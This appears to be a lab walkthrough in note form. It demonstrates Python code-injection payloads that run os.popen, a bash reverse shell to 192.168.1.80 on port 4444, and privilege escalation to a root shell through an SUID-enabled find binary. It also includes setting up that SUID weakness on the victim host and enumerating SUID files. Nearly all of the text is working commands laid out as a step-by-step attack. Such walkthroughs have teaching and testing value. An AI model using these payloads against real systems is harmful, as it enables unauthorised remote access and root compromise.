-- Victim / Webserver Host --

# Prior to the attack, we first create an SUID executable vulnerability in order to demonstrate the exploitation, we run the following command on the Find command #
sudo chmod u+s /usr/bin/find
This enables SUID permission on Find so that we as the attacker can exploit and launch Find as root user.

-- Attacker part --

# Find out the current user #
__import__('os').popen('whoami').read();
import os; print(os.popen("whoami").read())


# Reverse shell #
__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.1.80/4444 0>&1"').read()


# Simple reconnaissance #
# The ls -al command is a combination of ls -l (use a long listing format) and ls -a (do not ignore entries starting with .) #
ls -la


# Verify the Current User and Privileged allowed #
# id command in Linux is used to find out user and group names and numeric ID’s (UID or group ID) of the current user or any other user in the server #
id


# As we now have access to victim’s machine, we will use Find command to identify binaries having SUID permission #
# Find command to identify binaries having SUID permission #
find / -type f -perm -4000 -exec ls -l {} \; 2> /dev/null
Or
find / -perm -u=s -type f 2>/dev/null


# The binary that we are interested in is the /usr/bin/find. We can now execute commands on Find using the -exec parameter to launch a privileged and interactive bash shell #
# Find command to get privileged and interactive shell #
find /usr/bin/ -name find -exec /bin/bash -ip \;


# With this, simply run id and it will show that the uid is the user whereas the euid is root, we can now run privileged commands with the shell #
# id command to check the user and verify root privileged #
id
